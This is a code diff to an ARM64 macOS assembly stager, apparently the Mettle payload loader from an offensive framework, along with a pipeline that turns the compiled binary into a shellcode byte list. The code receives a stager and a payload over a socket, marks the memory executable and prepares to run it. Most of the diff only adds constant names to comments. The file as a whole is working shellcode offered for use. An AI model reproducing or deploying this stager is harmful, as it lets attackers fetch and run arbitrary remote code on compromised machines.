@@ -1,5 +1,5 @@
 // Compile: clang stage_mettle.s
-// Shellcode: objdump -d a.out | cut -d ' ' -f 2-5
+// Shellcode: objdump -d a.out | cut -d ' ' -f 2-5 | grep -Ev ':|o|^$' | rev | awk '{print "0x"$1$2$3$4","}'
 .equ SYS_RECVFROM, 0x200001d
 .equ SYS_MPROTECT, 0x200004a
 .equ SYS_MMAP, 0x20000c5
@@ -7,7 +7,7 @@
 
 .global _main
 _main:
-    /* mmap(addr=0, length=stager_size, prot=2, flags=0x1002, fd=0, offset=0) */
+    /* mmap(addr=0, length=stager_size, prot=0x2 (PROT_WRITE), flags=0x1002 (MAP_PRIVATE | MAP_ANON), fd=0, offset=0) */
     mov    x0, xzr
     adr    x1, stager_size
     ldr    x1, [x1]
@@ -21,7 +21,7 @@ _main:
     /* sockfd is in x13 */
     mov x10, x0
 
-    /* recvfrom(sockfd='x13', address='x10', length=stager_size, flags='MSG_WAITALL', from=0, fromlenaddr=0) */
+    /* recvfrom(sockfd='x13', address='x10', length=stager_size, flags=0x40 (MSG_WAITALL), from=0, fromlenaddr=0) */
     mov x0, x13
     mov x1, x10
     adr x2, stager_size
@@ -32,7 +32,7 @@ _main:
     ldr x16, =SYS_RECVFROM
     svc 0
 
-    /* mprotect(addr='x10',  length=stager_size, prot=0x5) */
+    /* mprotect(addr='x10',  length=stager_size, prot=0x5 (PROT_READ | PROT_EXEC)) */
     mov x0, x10
     adr x1, stager_size
     ldr x1, [x1]
@@ -40,7 +40,7 @@ _main:
     ldr x16, =SYS_MPROTECT
     svc 0
 
-    /* mmap(addr=0, length=payload_size, prot=3, flags=0x1002, fd=0, offset=0) */
+    /* mmap(addr=0, length=payload_size, prot=3 (PROT_READ | PROT_WRITE), flags=0x1002 (MAP_PRIVATE | MAP_ANON), fd=0, offset=0) */
     mov x0, xzr
     adr x1, payload_size
     ldr x1, [x1]
@@ -53,7 +53,7 @@ _main:
 
     mov x11, x0
 
-    /* recvfrom(sockfd='x13', address='x11', length=payload_size, flags='MSG_WAITALL', from=0, fromlenaddr=0) */
+    /* recvfrom(sockfd='x13', address='x11', length=payload_size, flags=0x40 (MSG_WAITALL), from=0, fromlenaddr=0) */
     mov x0, x13
     mov x1, x11
     adr x2, payload_size
@@ -74,7 +74,7 @@ _main:
     mov x15, x0
     
     /* make stack space */
-    /* mmap(addr=0, length=0x40000, prot=3, flags=0x1002, fd=0, offset=0) */
+    /* mmap(addr=0, length=0x40000, prot=3 (PROT_READ | PROT_WRITE), flags=0x1002 (MAP_PRIVATE | MAP_ANON), fd=0, offset=0) */
     mov x0, xzr
     mov x1, 0x40000
     mov x2, 3
